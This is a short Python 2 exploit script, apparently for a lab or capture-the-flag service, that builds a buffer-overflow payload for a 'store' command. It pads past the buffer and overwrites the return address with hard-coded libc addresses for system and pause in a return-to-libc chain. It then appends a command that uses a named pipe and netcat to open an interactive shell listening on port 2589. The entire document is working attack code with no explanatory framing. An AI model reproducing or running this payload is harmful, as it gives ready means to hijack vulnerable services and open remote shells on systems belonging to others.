#!/usr/bin/python

import struct

def p(x):
	return	struct.pack('<L',x)

#System call
execvp=0xb7edb940
pause=0xb7edb090
system=0xb7e65190

mem=0xbffff6f8

payload=""

#First command
payload+="store"

#Complete Payload for command
for i in range(0,27):
	payload+='S'

#File Length
payload+="000400"

for i in range(0,400):
	payload+='A'

for i in range(0,12):
	payload+="BBBB"
for i in range(0,4):
	payload+='FFFF'
	
payload+=p(system)
payload+=p(pause)
payload+=p(mem)

#Create a shell listening to 127.0.0.1 2589
payload+="mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 2589 > /tmp/f"

payload+=p(0x00000000)

print payload
